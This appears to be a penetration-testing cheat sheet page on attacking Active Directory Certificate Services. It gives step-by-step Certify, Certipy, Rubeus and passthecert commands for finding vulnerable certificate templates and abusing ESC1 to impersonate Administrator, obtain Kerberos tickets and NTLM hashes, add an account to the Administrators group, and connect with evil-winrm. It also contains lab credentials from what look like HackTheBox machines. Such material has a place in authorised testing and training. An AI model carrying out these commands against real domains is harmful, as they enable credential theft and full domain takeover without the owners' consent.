---
description: >-
  AD CS is Microsoft’s PKI implementation that provides everything from
  encrypting file systems, to digital signatures, to user authentication (a
  large focus of our research), and more.
---

# ADCS attacks

{% embed url="https://www.thehacker.recipes/a-d/movement/ad-cs" %}

There are several different attack vectors including below.&#x20;

* **Credential theft** (dubbed THEFT1 to THEFT5)
* **Account persistence** (dubbed PERSIST1 to PERSIST3)
* **Domain escalation** (dubbed ESC1 to ESC8)
  * based on [misconfigured certificate templates](broken-reference)
  * based on [dangerous CA configuration](broken-reference)
  * related to [access control vulnerabilities](broken-reference)
  * based on an NTLM relay vulnerability related to the [web endpoints of AD CS](broken-reference)
* **Domain persistence** (dubbed DPERSIST1 to DPERSIST3)
  * by [forging certificates with a stolen CA certificates](broken-reference)
  * by trusting rogue CA certificates
  * by [maliciously creating vulnerable access controls](broken-reference)

### Initial Recon

{% code overflow="wrap" %}
```bash
# From UNIX-like systems: 
Kali> rpc net group members "Cert Publishers" -U "DOMAIN"/"User"%"Password" -S "DomainController"
# From Windows systems: 
CMD> net group "Cert Publishers" /domain
```
{% endcode %}

### Vulnerability Check

{% code overflow="wrap" %}
```bash
# Windows 
#  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries   

CMD> Certify.exe cas 
CMD> Certify find /vulnerable

# Linux
# https://github.com/ly4k/Certipy
Kali> certipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -vulnerable -stdout
Kali> certipy find -u Ryan.Cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable

Kali> certipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -old-bloodhound

#Certipy also supports BloodHound. With the -old-bloodhound option, the data will be exported for the original version of BloodHound. With the -bloodhound option, the data will be exported for the modified version of BloodHound, forked by Certipy's author (default output when no flag is set).
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

### Certificate templates

{% embed url="https://www.thehacker.recipes/a-d/movement/ad-cs/certificate-templates" %}

### Template allows SAN (ESC1)

When a certificate template allows to specify a `subjectAltName`, it is possible to request a certificate for another user. It can be used for privileges escalation if the EKU specifies `Client Authentication` or `ANY`.

#### Windows&#x20;

{% code overflow="wrap" %}
```bash
# Find vulnerable/abusable certificate templates using default low-privileged group
CMD> Certify.exe find /vulnerable

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
CMD> Certify.exe find /vulnerable /currentuser

# Once a vulnerable template is found, a request shall be made to obtain a certificate, with another high-priv user set as SAN (subjectAltName).
CMD> Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin"

# Create a cert.pem based on the base64 cert output by the command above, and convert it to pem format. 
Kali> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Obtain the TGT. You can convert it to a ccache format to use in Linux later
CMD> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt

# Ask Credentials. You can conduct normal path the hash attack. 
CMD> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

#### See the [Pass the Ticket](kerberos-attack/pass-the-ticket.md) section to convert the ticket to Linux format.&#x20;

#### Linux

{% code overflow="wrap" %}
```bash
#To specify a user account in the SAN
Kali> certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'

certipy req -u Ryan.Cooper -p NuclearMosquito3 -target sequel.htb -upn Administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication

#To specify a computer account in the SAN
Kali> certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'

# Obtain the TGT   
Kali> certipy auth -pfx administrator.pfx 
# After this, you can export it to the KRB5CCNAME variable, and run any commands you want with the new TGT privilege such as secredump/psexec, etc... 

# Obtain the credentials
Kali> certipy auth -pfx <new cert>.pfx
# Typically, you get a NTLM hash. 

# Pass the cert
# 1) Extract Public Key Cert and Private Key  
Kali> certipy cert -pfx <new cert>.pfx -nokey -out user.crt
Kali> certipy cert -pfx <new cert>.pfx -nocert -out user.key
# 2) Create a ldap shell session with the Cert and Key
Kali> python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain htb.corp -dc-ip 10.129.237.92
# #) Add a new user to Administrators 
LDAP_SHELL> add_user_to_group svc_ldap Administrators
# Acccess to the target with new user and credential
Kali> evil-winrm -i 10.129.237.92 -u 'svc_ldap@htb.corp' -p 'lDaP_1n_th3_cle4r!'
```
{% endcode %}

#### To fix CLOCK SKEY issue

```bash
# Synchronize time in case you have CLOCK SKEY issue. 
Kali> sudo ntpdate <DC FQDN>  
sudo ntupdate dc01.sequel.htb 
```

{% embed url="https://app.gitbook.com/o/sbYQpaBkV0ueQjvLIdTt/s/nA4bAkddGXesk1QCLYAY/~/changes/408/active-directory/kerberos-attack/overpass-the-hash-attack#kerberos-tickets" %}

